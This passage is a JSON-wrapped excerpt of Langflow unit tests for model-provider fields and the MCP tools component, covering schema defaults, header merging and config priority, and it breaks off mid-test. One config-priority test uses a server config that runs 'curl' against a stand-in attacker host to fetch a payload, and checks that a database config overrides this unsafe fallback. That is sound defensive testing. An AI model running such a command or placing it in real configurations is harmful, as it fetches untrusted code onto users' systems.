field_name=\\\"model\\\")\\n\\n        assert updated[\\\"ollama_base_url\\\"][\\\"show\\\"] is True\\n        assert updated[\\\"base_url_ibm_watsonx\\\"][\\\"show\\\"] is False\\n        assert updated[\\\"project_id\\\"][\\\"show\\\"] is False\\n\\n    @patch(\\\"lfx.base.models.unified_models.get_language_model_options\\\")\\n    async def test_update_build_config_hides_ollama_url_when_openai_selected(\\n        self, mock_opts, component_class, default_kwargs\\n    ):\\n        \\\"\\\"\\\"Selecting OpenAI hides ollama_base_url and WatsonX-specific fields.\\\"\\\"\\\"\\n        openai_model = [{\\\"name\\\": \\\"gpt-4o\\\", \\\"provider\\\": \\\"OpenAI\\\", \\\"metadata\\\": {}}]\\n        mock_opts.return_value = openai_model\\n        component = component_class(**default_kwargs)\\n        component._user_id = None\\n\\n        build_config = self._get_build_config(component)\\n\\n        updated = component.update_build_config(build_config, openai_model, field_name=\\\"model\\\")\\n\\n        assert updated[\\\"ollama_base_url\\\"][\\\"show\\\"] is False\\n        assert updated[\\\"base_url_ibm_watsonx\\\"][\\\"show\\\"] is False\\n        assert updated[\\\"project_id\\\"][\\\"show\\\"] is False\\n\\n    @patch(\\\"lfx.base.models.unified_models.get_language_model_options\\\")\\n    async def test_update_build_config_shows_watsonx_fields_when_watsonx_selected(\\n        self, mock_opts, component_class, default_kwargs\\n    ):\\n        \\\"\\\"\\\"Selecting IBM WatsonX shows both watsonx URL and project_id fields.\\\"\\\"\\\"\\n        watsonx_model = [{\\\"name\\\": \\\"ibm/granite-13b-chat-v2\\\", \\\"provider\\\": \\\"IBM WatsonX\\\", \\\"metadata\\\": {}}]\\n        mock_opts.return_value = watsonx_model\\n        component = component_class(**default_kwargs)\\n        component._user_id = None\\n\\n        build_config = self._get_build_config(component)\\n\\n        updated = component.update_build_config(build_config, watsonx_model, field_name=\\\"model\\\")\\n\\n        assert updated[\\\"base_url_ibm_watsonx\\\"][\\\"show\\\"] is True\\n        assert updated[\\\"base_url_ibm_watsonx\\\"][\\\"required\\\"] is False\\n        assert updated[\\\"project_id\\\"][\\\"show\\\"] is True\\n        assert updated[\\\"ollama_base_url\\\"][\\\"show\\\"] is False\\n\\n    @patch(\\\"lfx.base.models.unified_models.get_language_model_options\\\")\\n    async def test_update_build_config_hides_all_provider_fields_with_no_model(\\n        self, mock_opts, component_class, default_kwargs\\n    ):\\n        \\\"\\\"\\\"With no model selected all provider-specific fields should be hidden.\\\"\\\"\\\"\\n        mock_opts.return_value = []\\n        component = component_class(**default_kwargs)\\n        component._user_id = None\\n\\n        build_config = self._get_build_config(component)\\n\\n        updated = component.update_build_config(build_config, \\\"\\\", field_name=None)\\n\\n        assert updated[\\\"ollama_base_url\\\"][\\\"show\\\"] is False\\n        assert updated[\\\"base_url_ibm_watsonx\\\"][\\\"show\\\"] is False\\n        assert updated[\\\"project_id\\\"][\\\"show\\\"] is False\\n\"},{\"record_type\":\"third_party_source_reference\",\"source_repository\":\"langflow-main\",\"source_path\":\"src/backend/tests/unit/components/models_and_agents/test_mcp_component.py\",\"source_license\":\"MIT\",\"trust\":\"untrusted_reference_only\",\"retrieval_policy\":\"internal_reference_only\",\"source_sha256\":\"6720338d42de5217a70bc22a74f3c1eb58552fadb80d897f9f9e74bb8986ed3d\",\"content\":\"\\\"\\\"\\\"Unit tests for MCP component with actual MCP servers.\\n\\nThis test suite validates the MCP component functionality using real MCP servers:\\n- Everything server (stdio mode) - provides echo and other tools\\n- HTTP/SSE servers (streamable HTTP mode) - provides various tools\\n\\\"\\\"\\\"\\n\\nimport re\\nimport shutil\\nfrom types import SimpleNamespace\\nfrom unittest.mock import AsyncMock, MagicMock, patch\\n\\nimport pytest\\nfrom langflow.services.deps import get_settings_service\\nfrom lfx.base.mcp.util import MCPSessionManager, MCPStdioClient, MCPStreamableHttpClient\\nfrom lfx.components.models_and_agents.mcp_component import MCPToolsComponent\\nfrom lfx.inputs.inputs import BoolInput, MessageTextInput, NestedDictInput\\nfrom lfx.schema.json_schema import create_input_schema_from_json_schema\\n\\nfrom tests.base import ComponentTestBaseWithoutClient, VersionComponentMapping\\n\\n\\nclass TestMCPToolsComponent(ComponentTestBaseWithoutClient):\\n    @pytest.fixture\\n    def component_class(self):\\n        \\\"\\\"\\\"Return the component class to test.\\\"\\\"\\\"\\n        return MCPToolsComponent\\n\\n    @pytest.fixture\\n    def default_kwargs(self):\\n        \\\"\\\"\\\"Return the default kwargs for the component.\\\"\\\"\\\"\\n        return {\\n            \\\"mode\\\": \\\"Stdio\\\",\\n            \\\"command\\\": \\\"npx -y @modelcontextprotocol/server-everything\\\",\\n            \\\"sse_url\\\": \\\"https://mcp.deepwiki.com/sse\\\",\\n            \\\"tool\\\": \\\"echo\\\",\\n            \\\"mcp_server\\\": {\\n                \\\"name\\\": \\\"test_server\\\",\\n                \\\"config\\\": {\\\"command\\\": \\\"uvx\\\", \\\"args\\\": [\\\"mcp-server-fetch\\\"]},\\n            },\\n        }\\n\\n    @pytest.fixture\\n    def file_names_mapping(self) -> list[VersionComponentMapping]:\\n        \\\"\\\"\\\"Return the file names mapping for different versions.\\\"\\\"\\\"\\n        return []\\n\\n    @pytest.mark.asyncio\\n    @pytest.mark.skipif(not shutil.which(\\\"npx\\\"), reason=\\\"Node.js not available\\\")\\n    async def test_component_initialization(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Test that the component initializes correctly.\\\"\\\"\\\"\\n        component = component_class(**default_kwargs)\\n\\n        # Check that the component has the expected attributes\\n        assert hasattr(component, \\\"stdio_client\\\")\\n        assert hasattr(component, \\\"streamable_http_client\\\")\\n        assert isinstance(component.stdio_client, MCPStdioClient)\\n        assert isinstance(component.streamable_http_client, MCPStreamableHttpClient)\\n\\n        # Check that the component has a session manager\\n        session_manager = component.stdio_client._get_session_manager()\\n        assert isinstance(session_manager, MCPSessionManager)\\n\\n\\nclass TestMCPToolsComponentSchemaHandling:\\n    @pytest.fixture\\n    def component(self):\\n        return MCPToolsComponent()\\n\\n    @staticmethod\\n    def _browser_use_schema():\\n        return {\\n            \\\"type\\\": \\\"object\\\",\\n            \\\"properties\\\": {\\n                \\\"task\\\": {\\\"type\\\": \\\"string\\\"},\\n                \\\"model\\\": {\\n                    \\\"anyOf\\\": [{\\\"type\\\": \\\"string\\\"}, {\\\"type\\\": \\\"null\\\"}],\\n                    \\\"default\\\": \\\"claude-sonnet-4.6\\\",\\n                },\\n                \\\"profile_id\\\": {\\n                    \\\"anyOf\\\": [{\\\"type\\\": \\\"string\\\"}, {\\\"type\\\": \\\"null\\\"}],\\n                    \\\"default\\\": None,\\n                },\\n                \\\"keep_alive\\\": {\\n                    \\\"anyOf\\\": [{\\\"type\\\": \\\"boolean\\\"}, {\\\"type\\\": \\\"null\\\"}],\\n                    \\\"default\\\": False,\\n                },\\n                \\\"output_schema\\\": {\\n                    \\\"anyOf\\\": [{\\\"type\\\": \\\"object\\\"}, {\\\"type\\\": \\\"null\\\"}],\\n                    \\\"default\\\": None,\\n                },\\n                \\\"proxy_country\\\": {\\n                    \\\"anyOf\\\": [{\\\"type\\\": \\\"string\\\"}, {\\\"type\\\": \\\"null\\\"}],\\n                    \\\"default\\\": \\\"us\\\",\\n                },\\n            },\\n            \\\"required\\\": [\\\"task\\\"],\\n        }\\n\\n    @pytest.mark.asyncio\\n    async def test_validate_schema_inputs_preserves_mcp_defaults(self, component):\\n        mock_tool = MagicMock()\\n        mock_tool.name = \\\"run_session\\\"\\n        mock_tool.args_schema = create_input_schema_from_json_schema(self._browser_use_schema())\\n\\n        inputs = await component._validate_schema_inputs(mock_tool)\\n        input_map = {input_.name: input_ for input_ in inputs}\\n\\n        assert isinstance(input_map[\\\"task\\\"], MessageTextInput)\\n        assert input_map[\\\"task\\\"].required is True\\n\\n        assert isinstance(input_map[\\\"model\\\"], MessageTextInput)\\n        assert input_map[\\\"model\\\"].value == \\\"claude-sonnet-4.6\\\"\\n\\n        assert isinstance(input_map[\\\"keep_alive\\\"], BoolInput)\\n        assert input_map[\\\"keep_alive\\\"].value is False\\n\\n        assert isinstance(input_map[\\\"output_schema\\\"], NestedDictInput)\\n        assert input_map[\\\"output_schema\\\"].value is None\\n\\n        assert isinstance(input_map[\\\"proxy_country\\\"], MessageTextInput)\\n        assert input_map[\\\"proxy_country\\\"].value == \\\"us\\\"\\n\\n    def test_build_tool_kwargs_omits_blank_optional_values(self, component):\\n        args_schema = create_input_schema_from_json_schema(self._browser_use_schema())\\n        component.task = \\\"Open docs homepage\\\"\\n        component.model = \\\"\\\"\\n        component.profile_id = \\\"\\\"\\n        component.keep_alive = False\\n        component.output_schema = {}\\n        component.proxy_country = \\\"\\\"\\n\\n        kwargs = component._build_tool_kwargs(args_schema)\\n\\n        assert kwargs == {\\n            \\\"task\\\": \\\"Open docs homepage\\\",\\n            \\\"keep_alive\\\": False,\\n        }\\n\\n\\nclass TestMCPToolsComponentIntegration:\\n    \\\"\\\"\\\"Integration tests for the MCPToolsComponent.\\\"\\\"\\\"\\n\\n    @pytest.fixture\\n    def component(self):\\n        \\\"\\\"\\\"Create a component for testing.\\\"\\\"\\\"\\n        return MCPToolsComponent()\\n\\n    @pytest.mark.asyncio\\n    @pytest.mark.skipif(not shutil.which(\\\"npx\\\"), reason=\\\"Node.js not available\\\")\\n    async def test_stdio_mode_integration(self, component):\\n        \\\"\\\"\\\"Test the component in stdio mode with Everything server.\\\"\\\"\\\"\\n        # Configure for stdio mode\\n        component.mode = \\\"Stdio\\\"\\n        component.command = \\\"npx -y @modelcontextprotocol/server-everything\\\"\\n        component.tool = \\\"echo\\\"\\n\\n        try:\\n            # Mock the update_tool_list method to simulate server connection\\n            tools, server_info = await component.update_tool_list()\\n\\n            # Should have tools\\n            assert len(tools) > 0\\n\\n            # Should have server info\\n            assert server_info is not None\\n            assert isinstance(server_info, dict)\\n\\n        except Exception as e:\\n            # If the server is not accessible, skip the test\\n            pytest.skip(f\\\"Everything server not accessible: {e}\\\")\\n\\n    @pytest.mark.asyncio\\n    async def test_streamable_http_mode_integration(self, component):\\n        \\\"\\\"\\\"Test the component in Streamable HTTP mode with DeepWiki server.\\\"\\\"\\\"\\n        # Configure for Streamable HTTP mode\\n        component.mode = \\\"Streamable HTTP\\\"\\n        component.streamable_http_url = \\\"https://mcp.deepwiki.com/mcp\\\"\\n\\n        try:\\n            # Mock the update_tool_list method to simulate server connection\\n            tools, server_info = await component.update_tool_list()\\n\\n            # Should have tools\\n            assert len(tools) > 0\\n\\n            # Should have server info\\n            assert server_info is not None\\n            assert isinstance(server_info, dict)\\n\\n        except Exception as e:\\n            # If the server is not accessible, skip the test\\n            pytest.skip(f\\\"DeepWiki server not accessible: {e}\\\")\\n\\n    @pytest.mark.asyncio\\n    async def test_session_context_setting(self, component):\\n        \\\"\\\"\\\"Test that session context is properly set.\\\"\\\"\\\"\\n        # Set session context on both clients\\n        component.stdio_client.set_session_context(\\\"test_context\\\")\\n        component.streamable_http_client.set_session_context(\\\"test_context\\\")\\n\\n        # Verify context was set\\n        assert component.stdio_client._session_context == \\\"test_context\\\"\\n        assert component.streamable_http_client._session_context == \\\"test_context\\\"\\n\\n    @pytest.mark.asyncio\\n    async def test_session_manager_sharing(self, component):\\n        \\\"\\\"\\\"Test that session managers are shared through component cache.\\\"\\\"\\\"\\n        # Ensure the component has a shared cache set up\\n        # If _shared_component_cache is None, clients will create separate instance managers\\n        if component._shared_component_cache is None:\\n            # Create a mock cache dict to ensure sharing\\n            from lfx.services.cache.utils import CacheMiss\\n\\n            cache_dict = {}\\n\\n            class MockCache:\\n                def get(self, key):\\n                    return cache_dict.get(key, CacheMiss())\\n\\n                def set(self, key, value):\\n                    cache_dict[key] = value\\n                    return value\\n\\n            mock_cache = MockCache()\\n            component._shared_component_cache = mock_cache\\n            component.stdio_client._component_cache = mock_cache\\n            component.streamable_http_client._component_cache = mock_cache\\n\\n        # Get session managers from both clients\\n        stdio_manager = component.stdio_client._get_session_manager()\\n        http_manager = component.streamable_http_client._get_session_manager()\\n\\n        # Both should be MCPSessionManager instances\\n        assert isinstance(stdio_manager, MCPSessionManager)\\n        assert isinstance(http_manager, MCPSessionManager)\\n\\n        # They should be the same instance (shared through cache)\\n        assert stdio_manager is http_manager\\n\\n\\nclass TestMCPComponentErrorHandling:\\n    \\\"\\\"\\\"Test error handling in MCP components.\\\"\\\"\\\"\\n\\n    @pytest.fixture\\n    def stdio_client(self):\\n        return MCPStdioClient()\\n\\n    @pytest.fixture\\n    def mock_session_manager(self):\\n        \\\"\\\"\\\"Create a mock session manager.\\\"\\\"\\\"\\n        return AsyncMock(spec=MCPSessionManager)\\n\\n    async def test_connect_to_server_with_command(self, stdio_client):\\n        \\\"\\\"\\\"Test connecting to server via Stdio with command.\\\"\\\"\\\"\\n        with patch.object(stdio_client, \\\"_get_or_create_session\\\") as mock_get_session:\\n            # Mock session\\n            mock_session = AsyncMock()\\n            mock_tool = MagicMock()\\n            mock_tool.name = \\\"test_tool\\\"\\n            list_tools_result = MagicMock()\\n            list_tools_result.tools = [mock_tool]\\n            mock_session.list_tools = AsyncMock(return_value=list_tools_result)\\n            mock_get_session.return_value = mock_session\\n\\n            tools = await stdio_client.connect_to_server(\\\"uvx test-command\\\")\\n\\n            assert len(tools) == 1\\n            assert tools[0].name == \\\"test_tool\\\"\\n            assert stdio_client._connected is True\\n            assert stdio_client._connection_params is not None\\n\\n    async def test_run_tool_success(self, stdio_client):\\n        \\\"\\\"\\\"Test successfully running a tool.\\\"\\\"\\\"\\n        # Setup connection state\\n        stdio_client._connected = True\\n        stdio_client._connection_params = MagicMock()\\n        stdio_client._session_context = \\\"test_context\\\"\\n\\n        with patch.object(stdio_client, \\\"_get_or_create_session\\\") as mock_get_session:\\n            mock_session = AsyncMock()\\n            mock_result = MagicMock()\\n            mock_session.call_tool = AsyncMock(return_value=mock_result)\\n            mock_get_session.return_value = mock_session\\n\\n            result = await stdio_client.run_tool(\\\"test_tool\\\", {\\\"param\\\": \\\"value\\\"})\\n\\n            assert result == mock_result\\n            mock_session.call_tool.assert_called_once_with(\\\"test_tool\\\", arguments={\\\"param\\\": \\\"value\\\"})\\n\\n    async def test_run_tool_without_connection(self, stdio_client):\\n        \\\"\\\"\\\"Test running a tool without being connected.\\\"\\\"\\\"\\n        stdio_client._connected = False\\n\\n        with pytest.raises(ValueError, match=\\\"Session not initialized\\\"):\\n            await stdio_client.run_tool(\\\"test_tool\\\", {})\\n\\n    async def test_disconnect_cleanup(self, stdio_client):\\n        \\\"\\\"\\\"Test that disconnect properly cleans up resources.\\\"\\\"\\\"\\n        stdio_client._session_context = \\\"test_context\\\"\\n        stdio_client._connected = True\\n\\n        with patch.object(stdio_client, \\\"_get_session_manager\\\") as mock_get_manager:\\n            mock_manager = AsyncMock()\\n            mock_get_manager.return_value = mock_manager\\n\\n            await stdio_client.disconnect()\\n\\n            mock_manager._cleanup_session.assert_called_once_with(\\\"test_context\\\")\\n            assert stdio_client.session is None\\n            assert stdio_client._connected is False\\n\\n\\nclass TestMCPComponentHeaders:\\n    \\\"\\\"\\\"Test the headers functionality in MCP component.\\\"\\\"\\\"\\n\\n    @pytest.fixture\\n    def component(self):\\n        \\\"\\\"\\\"Create a component for testing.\\\"\\\"\\\"\\n        return MCPToolsComponent()\\n\\n    def test_headers_input_exists(self, component):\\n        \\\"\\\"\\\"Test that headers input field exists in the component.\\\"\\\"\\\"\\n        input_names = [inp.name for inp in component.inputs]\\n        assert \\\"headers\\\" in input_names\\n\\n    def test_headers_in_default_keys(self, component):\\n        \\\"\\\"\\\"Test that headers is included in default_keys.\\\"\\\"\\\"\\n        assert \\\"headers\\\" in component.default_keys\\n\\n    def test_headers_input_is_list_type(self, component):\\n        \\\"\\\"\\\"Test that headers input is configured as a list (is_list=True).\\\"\\\"\\\"\\n        headers_input = next((inp for inp in component.inputs if inp.name == \\\"headers\\\"), None)\\n        assert headers_input is not None\\n        assert headers_input.is_list is True\\n\\n    def test_headers_input_is_advanced(self, component):\\n        \\\"\\\"\\\"Test that headers input is marked as advanced.\\\"\\\"\\\"\\n        headers_input = next((inp for inp in component.inputs if inp.name == \\\"headers\\\"), None)\\n        assert headers_input is not None\\n        assert headers_input.advanced is True\\n\\n    @pytest.mark.asyncio\\n    async def test_headers_merge_list_format(self, component):\\n        \\\"\\\"\\\"Test merging headers in list format [{\\\"key\\\": k, \\\"value\\\": v}].\\\"\\\"\\\"\\n        # Setup component with headers in list format\\n        component.headers = [\\n            {\\\"key\\\": \\\"Authorization\\\", \\\"value\\\": \\\"Bearer test-token\\\"},\\n            {\\\"key\\\": \\\"X-Custom-Header\\\", \\\"value\\\": \\\"custom-value\\\"},\\n        ]\\n\\n        server_config = {\\\"url\\\": \\\"http://test.url\\\", \\\"mode\\\": \\\"Streamable_HTTP\\\"}\\n\\n        # Simulate the merge logic from update_tool_list\\n        component_headers = getattr(component, \\\"headers\\\", None) or []\\n        component_headers_dict = {}\\n        if isinstance(component_headers, list):\\n            for item in component_headers:\\n                if isinstance(item, dict) and \\\"key\\\" in item and \\\"value\\\" in item:\\n                    component_headers_dict[item[\\\"key\\\"]] = item[\\\"value\\\"]\\n\\n        if component_headers_dict:\\n            existing_headers = server_config.get(\\\"headers\\\", {}) or {}\\n            merged_headers = {**existing_headers, **component_headers_dict}\\n            server_config[\\\"headers\\\"] = merged_headers\\n\\n        assert server_config[\\\"headers\\\"] == {\\n            \\\"Authorization\\\": \\\"Bearer test-token\\\",\\n            \\\"X-Custom-Header\\\": \\\"custom-value\\\",\\n        }\\n\\n    @pytest.mark.asyncio\\n    async def test_headers_merge_with_existing_headers(self, component):\\n        \\\"\\\"\\\"Test that component headers override existing server config headers.\\\"\\\"\\\"\\n        component.headers = [\\n            {\\\"key\\\": \\\"Authorization\\\", \\\"value\\\": \\\"Bearer new-token\\\"},\\n        ]\\n\\n        server_config = {\\n            \\\"url\\\": \\\"http://test.url\\\",\\n            \\\"mode\\\": \\\"Streamable_HTTP\\\",\\n            \\\"headers\\\": {\\\"Authorization\\\": \\\"Bearer old-token\\\", \\\"X-Existing\\\": \\\"existing-value\\\"},\\n        }\\n\\n        # Simulate the merge logic\\n        component_headers = getattr(component, \\\"headers\\\", None) or []\\n        component_headers_dict = {}\\n        if isinstance(component_headers, list):\\n            for item in component_headers:\\n                if isinstance(item, dict) and \\\"key\\\" in item and \\\"value\\\" in item:\\n                    component_headers_dict[item[\\\"key\\\"]] = item[\\\"value\\\"]\\n\\n        if component_headers_dict:\\n            existing_headers = server_config.get(\\\"headers\\\", {}) or {}\\n            merged_headers = {**existing_headers, **component_headers_dict}\\n            server_config[\\\"headers\\\"] = merged_headers\\n\\n        # Component headers should override existing\\n        assert server_config[\\\"headers\\\"][\\\"Authorization\\\"] == \\\"Bearer new-token\\\"\\n        # Existing headers should be preserved\\n        assert server_config[\\\"headers\\\"][\\\"X-Existing\\\"] == \\\"existing-value\\\"\\n\\n    @pytest.mark.asyncio\\n    async def test_headers_merge_empty_list(self, component):\\n        \\\"\\\"\\\"Test that empty headers list doesn't modify server config.\\\"\\\"\\\"\\n        component.headers = []\\n\\n        server_config = {\\n            \\\"url\\\": \\\"http://test.url\\\",\\n            \\\"headers\\\": {\\\"X-Existing\\\": \\\"value\\\"},\\n        }\\n\\n        component_headers = getattr(component, \\\"headers\\\", None) or []\\n        component_headers_dict = {}\\n        if isinstance(component_headers, list):\\n            for item in component_headers:\\n                if isinstance(item, dict) and \\\"key\\\" in item and \\\"value\\\" in item:\\n                    component_headers_dict[item[\\\"key\\\"]] = item[\\\"value\\\"]\\n\\n        if component_headers_dict:\\n            existing_headers = server_config.get(\\\"headers\\\", {}) or {}\\n            merged_headers = {**existing_headers, **component_headers_dict}\\n            server_config[\\\"headers\\\"] = merged_headers\\n\\n        # Should remain unchanged\\n        assert server_config[\\\"headers\\\"] == {\\\"X-Existing\\\": \\\"value\\\"}\\n\\n    @pytest.mark.asyncio\\n    async def test_headers_merge_none_headers(self, component):\\n        \\\"\\\"\\\"Test that None headers doesn't cause errors.\\\"\\\"\\\"\\n        component.headers = None\\n\\n        server_config = {\\\"url\\\": \\\"http://test.url\\\"}\\n\\n        component_headers = getattr(component, \\\"headers\\\", None) or []\\n        component_headers_dict = {}\\n        if isinstance(component_headers, list):\\n            for item in component_headers:\\n                if isinstance(item, dict) and \\\"key\\\" in item and \\\"value\\\" in item:\\n                    component_headers_dict[item[\\\"key\\\"]] = item[\\\"value\\\"]\\n\\n        if component_headers_dict:\\n            existing_headers = server_config.get(\\\"headers\\\", {}) or {}\\n            merged_headers = {**existing_headers, **component_headers_dict}\\n            server_config[\\\"headers\\\"] = merged_headers\\n\\n        # Should not have headers key added\\n        assert \\\"headers\\\" not in server_config\\n\\n    @pytest.mark.asyncio\\n    async def test_headers_merge_malformed_list_items(self, component):\\n        \\\"\\\"\\\"Test that malformed list items are skipped.\\\"\\\"\\\"\\n        component.headers = [\\n            {\\\"key\\\": \\\"Valid-Header\\\", \\\"value\\\": \\\"valid-value\\\"},\\n            {\\\"key\\\": \\\"Missing-Value\\\"},  # Missing \\\"value\\\"\\n            {\\\"value\\\": \\\"Missing-Key\\\"},  # Missing \\\"key\\\"\\n            \\\"not-a-dict\\\",  # Wrong type\\n            None,  # None item\\n            {\\\"key\\\": \\\"Another-Valid\\\", \\\"value\\\": \\\"another-value\\\"},\\n        ]\\n\\n        server_config = {\\\"url\\\": \\\"http://test.url\\\"}\\n\\n        component_headers = getattr(component, \\\"headers\\\", None) or []\\n        component_headers_dict = {}\\n        if isinstance(component_headers, list):\\n            for item in component_headers:\\n                if isinstance(item, dict) and \\\"key\\\" in item and \\\"value\\\" in item:\\n                    component_headers_dict[item[\\\"key\\\"]] = item[\\\"value\\\"]\\n\\n        if component_headers_dict:\\n            existing_headers = server_config.get(\\\"headers\\\", {}) or {}\\n            merged_headers = {**existing_headers, **component_headers_dict}\\n            server_config[\\\"headers\\\"] = merged_headers\\n\\n        # Only valid items should be included\\n        assert server_config[\\\"headers\\\"] == {\\n            \\\"Valid-Header\\\": \\\"valid-value\\\",\\n            \\\"Another-Valid\\\": \\\"another-value\\\",\\n        }\\n\\n    @pytest.mark.asyncio\\n    async def test_headers_merge_dict_format_fallback(self, component):\\n        \\\"\\\"\\\"Test that dict format still works as fallback.\\\"\\\"\\\"\\n        # Even though we use is_list=True, the code also supports dict format\\n        component.headers = {\\n            \\\"Authorization\\\": \\\"Bearer dict-token\\\",\\n            \\\"X-Dict-Header\\\": \\\"dict-value\\\",\\n        }\\n\\n        server_config = {\\\"url\\\": \\\"http://test.url\\\"}\\n\\n        component_headers = getattr(component, \\\"headers\\\", None) or []\\n        component_headers_dict = {}\\n        if isinstance(component_headers, list):\\n            for item in component_headers:\\n                if isinstance(item, dict) and \\\"key\\\" in item and \\\"value\\\" in item:\\n                    component_headers_dict[item[\\\"key\\\"]] = item[\\\"value\\\"]\\n        elif isinstance(component_headers, dict):\\n            component_headers_dict = component_headers\\n\\n        if component_headers_dict:\\n            existing_headers = server_config.get(\\\"headers\\\", {}) or {}\\n            merged_headers = {**existing_headers, **component_headers_dict}\\n            server_config[\\\"headers\\\"] = merged_headers\\n\\n        assert server_config[\\\"headers\\\"] == {\\n            \\\"Authorization\\\": \\\"Bearer dict-token\\\",\\n            \\\"X-Dict-Header\\\": \\\"dict-value\\\",\\n        }\\n\\n    @pytest.mark.asyncio\\n    async def test_headers_merge_existing_headers_as_list(self, component):\\n        \\\"\\\"\\\"Test merging when existing headers are also in list format.\\\"\\\"\\\"\\n        component.headers = [\\n            {\\\"key\\\": \\\"New-Header\\\", \\\"value\\\": \\\"new-value\\\"},\\n        ]\\n\\n        server_config = {\\n            \\\"url\\\": \\\"http://test.url\\\",\\n            \\\"headers\\\": [\\n                {\\\"key\\\": \\\"Existing-Header\\\", \\\"value\\\": \\\"existing-value\\\"},\\n            ],\\n        }\\n\\n        component_headers = getattr(component, \\\"headers\\\", None) or []\\n        component_headers_dict = {}\\n        if isinstance(component_headers, list):\\n            for item in component_headers:\\n                if isinstance(item, dict) and \\\"key\\\" in item and \\\"value\\\" in item:\\n                    component_headers_dict[item[\\\"key\\\"]] = item[\\\"value\\\"]\\n\\n        if component_headers_dict:\\n            existing_headers = server_config.get(\\\"headers\\\", {}) or {}\\n            # Convert existing headers from list to dict if needed\\n            if isinstance(existing_headers, list):\\n                existing_dict = {}\\n                for item in existing_headers:\\n                    if isinstance(item, dict) and \\\"key\\\" in item and \\\"value\\\" in item:\\n                        existing_dict[item[\\\"key\\\"]] = item[\\\"value\\\"]\\n                existing_headers = existing_dict\\n            merged_headers = {**existing_headers, **component_headers_dict}\\n            server_config[\\\"headers\\\"] = merged_headers\\n\\n        assert server_config[\\\"headers\\\"] == {\\n            \\\"Existing-Header\\\": \\\"existing-value\\\",\\n            \\\"New-Header\\\": \\\"new-value\\\",\\n        }\\n\\n    @pytest.mark.asyncio\\n    async def test_headers_with_special_characters(self, component):\\n        \\\"\\\"\\\"Test headers with special characters in values.\\\"\\\"\\\"\\n        component.headers = [\\n            {\\\"key\\\": \\\"Authorization\\\", \\\"value\\\": \\\"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test\\\"},\\n            {\\\"key\\\": \\\"X-Special\\\", \\\"value\\\": \\\"value with spaces and !@#$%\\\"},\\n        ]\\n\\n        server_config = {\\\"url\\\": \\\"http://test.url\\\"}\\n\\n        component_headers = getattr(component, \\\"headers\\\", None) or []\\n        component_headers_dict = {}\\n        if isinstance(component_headers, list):\\n            for item in component_headers:\\n                if isinstance(item, dict) and \\\"key\\\" in item and \\\"value\\\" in item:\\n                    component_headers_dict[item[\\\"key\\\"]] = item[\\\"value\\\"]\\n\\n        if component_headers_dict:\\n            server_config[\\\"headers\\\"] = component_headers_dict\\n\\n        assert server_config[\\\"headers\\\"][\\\"Authorization\\\"] == \\\"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test\\\"\\n        assert server_config[\\\"headers\\\"][\\\"X-Special\\\"] == \\\"value with spaces and !@#$%\\\"\\n\\n    @pytest.mark.asyncio\\n    async def test_headers_empty_string_values(self, component):\\n        \\\"\\\"\\\"Test headers with empty string values.\\\"\\\"\\\"\\n        component.headers = [\\n            {\\\"key\\\": \\\"X-Empty\\\", \\\"value\\\": \\\"\\\"},\\n            {\\\"key\\\": \\\"X-Valid\\\", \\\"value\\\": \\\"valid\\\"},\\n        ]\\n\\n        server_config = {\\\"url\\\": \\\"http://test.url\\\"}\\n\\n        component_headers = getattr(component, \\\"headers\\\", None) or []\\n        component_headers_dict = {}\\n        if isinstance(component_headers, list):\\n            for item in component_headers:\\n                if isinstance(item, dict) and \\\"key\\\" in item and \\\"value\\\" in item:\\n                    component_headers_dict[item[\\\"key\\\"]] = item[\\\"value\\\"]\\n\\n        if component_headers_dict:\\n            server_config[\\\"headers\\\"] = component_headers_dict\\n\\n        # Empty string is still a valid value\\n        assert server_config[\\\"headers\\\"][\\\"X-Empty\\\"] == \\\"\\\"\\n        assert server_config[\\\"headers\\\"][\\\"X-Valid\\\"] == \\\"valid\\\"\\n\\n\\nclass TestMCPComponentConfigPriority:\\n    \\\"\\\"\\\"Test configuration priority in MCP component - database over tweaks/value.\\\"\\\"\\\"\\n\\n    @pytest.fixture\\n    def component(self):\\n        \\\"\\\"\\\"Create a component for testing.\\\"\\\"\\\"\\n        return MCPToolsComponent()\\n\\n    @pytest.mark.asyncio\\n    async def test_database_config_takes_priority_over_value(self, component):\\n        \\\"\\\"\\\"Test that database config takes priority over config from mcp_server value.\\\"\\\"\\\"\\n        # Set up component with a server config in the value\\n        value_config = {\\n            \\\"command\\\": \\\"curl\\\",\\n            \\\"args\\\": [\\\"https://attacker.invalid/payload\\\"],\\n            \\\"env\\\": {\\\"TEST\\\": \\\"value\\\"},\\n        }\\n        component.mcp_server = {\\\"name\\\": \\\"test_server\\\", \\\"config\\\": value_config}\\n        component._user_id = \\\"test_user_123\\\"\\n\\n        # Mock the database get_server to return a different config\\n        db_config = {\\n            \\\"command\\\": \\\"uvx\\\",\\n            \\\"args\\\": [\\\"mcp-server-from-database\\\", \\\"--prod\\\"],\\n            \\\"env\\\": {\\\"TEST\\\": \\\"database\\\"},\\n        }\\n\\n        with (\\n            patch(\\\"langflow.api.v2.mcp.get_server\\\") as mock_get_server,\\n            patch(\\\"langflow.services.database.models.user.crud.get_user_by_id\\\") as mock_get_user,\\n            patch(\\\"lfx.components.models_and_agents.mcp_component.session_scope\\\"),\\n            patch.object(component.stdio_client, \\\"connect_to_server\\\") as mock_connect,\\n        ):\\n            mock_get_user.return_value = MagicMock(id=\\\"test_user_123\\\")\\n            mock_get_server.return_value = db_config\\n            mock_connect.return_value = []\\n\\n            # Call update_tool_list which should use db_config, not value_config\\n            await component.update_tool_list()\\n\\n            # Verify that connect_to_server was called\\n            mock_connect.assert_called_once()\\n            full_command = mock_connect.call_args.args[0]\\n            # The validated database config must win over the unsafe embedded fallback.\\n            assert full_command == \\\"uvx mcp-server-from-database --prod\\\"\\n\\n            # Database should be queried first\\n            mock_get_server.assert_called_once()\\n\\n    @pytest.mark.asyncio\\n    async def test_database_config_used_when_no_value_config(self, component):\\n        \\\"\\\"\\\"Test that database config is used when no config in value.\\\"\\\"\\\"\\n        # Set up component with only server name, no config\\n        component.mcp_server = \\\"test_server\\\"\\n        component._user_id = \\\"test_user_123\\\"\\n\\n        # Mock the database get_server to return a config\\n        db_config = {\\n            \\\"command\\\": \\\"uvx\\\",\\n            \\\"args\\\": [\\\"mcp-server-from-database\\\", \\\"--prod\\\"],\\n            \\\"env\\\": {\\\"TEST\\\": \\\"database\\\"},\\n        }\\n\\n        with (\\n            